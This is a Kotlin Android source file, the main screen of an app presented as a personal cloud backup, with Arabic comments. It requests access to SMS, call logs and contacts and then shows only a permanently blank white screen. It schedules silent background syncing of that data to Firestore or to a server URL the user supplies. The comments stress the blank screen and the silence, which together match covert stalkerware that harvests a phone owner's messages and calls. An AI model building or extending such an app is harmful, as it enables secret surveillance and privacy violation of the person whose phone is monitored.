package com.personal.cloudbackup.ui

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.personal.cloudbackup.auth.AppAuthManager
import com.personal.cloudbackup.worker.WorkScheduler
import kotlinx.coroutines.launch

/**
 * شاشة التطبيق الرئيسية:
 *
 * 1. لا تستخدم Firebase Authentication ولا حسابات Google نهائياً.
 * 2. يدخل المستخدم اسم المستخدم وكلمة المرور الخاصة بالتطبيق لمرة واحدة فقط عند التثبيت.
 * 3. يتم حفظ الجلسة محلياً بشكل دائم؛ وبعدها تظل الشاشة بيضاء فارغة تماماً 100% (Pure Blank White Screen).
 * 4. تتم جميع عمليات النسخ والمزامنة في الخلفية مباشرة مع Cloud Firestore (خطة Spark المجانية) في صمت تام دون الحاجة لـ Firebase Storage.
 */
class MainActivity : AppCompatActivity() {

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val callLogGranted = permissions[Manifest.permission.READ_CALL_LOG] ?: false
        val smsGranted = permissions[Manifest.permission.READ_SMS] ?: false

        if (callLogGranted && smsGranted) {
            checkAppSession()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // شاشة بيضاء ناصعة 100%
        showBlankWhiteScreen()

        // فحص الصلاحيات وطلبها
        checkAndRequestOfficialPermissions()
    }

    private fun showBlankWhiteScreen() {
        val blankWhiteView = View(this).apply {
            setBackgroundColor(Color.WHITE)
        }
        setContentView(blankWhiteView)
    }

    private fun checkAndRequestOfficialPermissions() {
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS
        )

        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isNotEmpty()) {
            permissionLauncher.launch(missingPermissions.toTypedArray())
        } else {
            checkAppSession()
        }
    }

    private fun checkAppSession() {
        // إذا كان المستخدم مسجلاً مسبقاً في حساب التطبيق، لا نطلب أي شيء ونفعّل العمل في الخلفية مباشرة
        if (AppAuthManager.isLoggedIn(this)) {
            WorkScheduler.schedulePeriodicBackup(applicationContext)
            WorkScheduler.triggerImmediateSync(applicationContext)
            showBlankWhiteScreen()
            return
        }

        // إذا لم يكن مسجلاً، نظهر له نافذة إدخال بيانات حساب التطبيق فقط
        showAppLoginDialog()
    }

    private fun showAppLoginDialog() {
        val context = this
        val layout = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 40, 50, 20)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        val descView = TextView(context).apply {
            text = "أدخل اسم المستخدم وكلمة المرور الخاصة بك لربط مساحة المزامنة السحابية في الخلفية:"
            textSize = 14f
            setTextColor(Color.DKGRAY)
            setPadding(0, 0, 0, 30)
        }

        val serverUrlInput = EditText(context).apply {
            hint = "عنوان الخادم (Backend URL)"
            setText(AppAuthManager.getServerUrl(context))
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
            setSingleLine(true)
        }

        val usernameInput = EditText(context).apply {
            hint = "اسم المستخدم (Username)"
            inputType = InputType.TYPE_CLASS_TEXT
            setSingleLine(true)
        }

        val passwordInput = EditText(context).apply {
            hint = "كلمة المرور (Password)"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            setSingleLine(true)
        }

        layout.addView(descView)
        layout.addView(serverUrlInput)
        layout.addView(usernameInput)
        layout.addView(passwordInput)

        val dialog = AlertDialog.Builder(context)
            .setTitle("حساب التطبيق الشخصي")
            .setView(layout)
            .setCancelable(false)
            .setPositiveButton("تسجيل وتفعيل المزامنة", null)
            .create()

        dialog.setOnShowListener {
            val button = dialog.getButton(AlertDialog.BUTTON_POSITIVE)
            button.setOnClickListener {
                val serverUrl = serverUrlInput.text.toString().trim()
                val username = usernameInput.text.toString().trim()
                val password = passwordInput.text.toString().trim()

                if (username.length < 3) {
                    Toast.makeText(context, "اسم المستخدم يجب أن يكون 3 أحرف على الأقل", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                if (password.length < 4) {
                    Toast.makeText(context, "كلمة المرور يجب أن تكون 4 خانات على الأقل", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }

                button.isEnabled = false
                button.text = "جارِ الربط..."

                lifecycleScope.launch {
                    val result = AppAuthManager.loginOrRegister(applicationContext, username, password, serverUrl)
                    if (result.isSuccess) {
                        dialog.dismiss()
                        // تفعيل جدولة WorkManager والمزامنة الفورية
                        WorkScheduler.schedulePeriodicBackup(applicationContext)
                        WorkScheduler.triggerImmediateSync(applicationContext)
                        // العودة إلى الشاشة البيضاء الفارغة دائماً
                        showBlankWhiteScreen()
                        Toast.makeText(context, "تم تفعيل المزامنة السحابية في الخلفية بنجاح", Toast.LENGTH_SHORT).show()
                    } else {
                        button.isEnabled = true
                        button.text = "تسجيل وتفعيل المزامنة"
                        Toast.makeText(context, result.exceptionOrNull()?.localizedMessage ?: "حدث خطأ في الاتصال بالخادم", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }

        dialog.show()
    }
}
